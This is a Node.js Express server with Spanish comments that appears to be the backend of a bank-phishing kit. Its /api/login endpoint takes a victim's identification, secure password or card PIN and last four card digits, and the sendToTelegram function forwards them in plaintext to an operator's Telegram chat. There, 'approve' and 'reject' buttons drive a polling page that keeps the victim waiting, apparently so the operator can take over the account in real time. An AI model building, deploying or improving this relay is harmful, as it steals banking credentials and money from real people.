import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json()); // Importante para parsear el body JSON

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

// Verificación al arrancar
console.log("=== CONFIGURACIÓN DEL BACKEND ===");
console.log("BOT_TOKEN:", BOT_TOKEN ? "Configurado" : "❌ FALTA");
console.log("CHAT_ID:", CHAT_ID ? "Configurado" : "❌ FALTA");
console.log("=================================");

const requestsDB = new Map();

async function sendToTelegram(requestId, data) {
    const isTarjeta = data.tipo === 'tarjeta';
    
    let text = `<b>⚠️ NUEVA SOLICITUD DE VALIDACIÓN</b>\n\n`;
    text += `<b>Identificación:</b> ${data.identificacion}\n`;
    
    if (isTarjeta) {
        text += `<b>Clave Tarjeta:</b> ${data.clave}\n`;
        text += `<b>Últimos 4 dígitos:</b> ${data.ultimos4}\n`;
    } else {
        text += `<b>Clave Segura:</b> ${data.clave}\n`;
    }
    
    text += `\n<i>El usuario está esperando respuesta...</i>`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar", callback_data: `approve_${requestId}` },
                { text: "❌ Rechazar", callback_data: `reject_${requestId}` }
            ]
        ]
    };

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
        
        if (requestsDB.has(requestId)) {
            requestsDB.get(requestId).messageId = response.data.result.message_id;
        }
        console.log(`✅ Mensaje enviado a Telegram para requestId: ${requestId}`);
        
    } catch (error) {
        // Este log es CLAVE para ver por qué falla Telegram
        console.error("❌ Error enviando a Telegram:");
        console.error("Status:", error.response?.status);
        console.error("Data:", JSON.stringify(error.response?.data, null, 2));
        console.error("Message:", error.message);
    }
}

// 1. Endpoint que recibe los datos del front
app.post('/api/login', async (req, res) => {
    // LOG DE DIAGNÓSTICO: Ver qué llega exactamente
    console.log("📥 Petición recibida en /api/login");
    console.log("Body:", JSON.stringify(req.body, null, 2));

    const { identificacion, clave, ultimos4, tipo } = req.body;

    // Validaciones básicas
    if (!identificacion || !clave) {
        console.log("❌ Faltan datos: identificacion o clave");
        return res.status(400).json({ error: "Faltan datos requeridos." });
    }

    // Generamos un ID único para esta solicitud
    const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
    console.log(`🔑 RequestID generado: ${requestId}`);
    
    requestsDB.set(requestId, {
        status: 'pending',
        data: { identificacion, clave, ultimos4, tipo },
        messageId: null
    });

    // Enviamos a Telegram asíncronamente (sin await para no bloquear)
    sendToTelegram(requestId, { identificacion, clave, ultimos4, tipo });

    // Respondemos al front con el ID
    res.json({ requestId });
});

// 2. Endpoint de Polling
app.get('/api/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const request = requestsDB.get(requestId);

    if (!request) {
        return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
    }

    res.json({ status: request.status });
});

// 3. Webhook de Telegram
app.post('/api/webhook/telegram', async (req, res) => {
    const { callback_query } = req.body;

    if (!callback_query) {
        return res.sendStatus(200);
    }

    const data = callback_query.data;
    const messageId = callback_query.message.message_id;
    const chatId = callback_query.message.chat.id;

    const [action, requestId] = data.split('_');

    if (requestsDB.has(requestId)) {
        const request = requestsDB.get(requestId);
        request.status = action === 'approve' ? 'approved' : 'rejected';

        const actionText = action === 'approve' ? '✅ <b>APROBADO</b>' : '❌ <b>RECHAZADO</b>';
        
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: `${actionText}\n\n<i>El usuario ha sido notificado.</i>`,
                parse_mode: 'HTML'
            });
        } catch (error) {
            console.error("Error editando mensaje:", error.message);
        }

        res.sendStatus(200);
    } else {
        res.sendStatus(404);
    }
});

// Ruta de salud
app.get('/', (req, res) => {
    res.send('Backend funcionando correctamente.');
});

// Manejo de errores global
app.use((err, req, res, next) => {
    console.error("❌ Error global:", err);
    res.status(500).json({ error: "Error interno del servidor" });
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
});
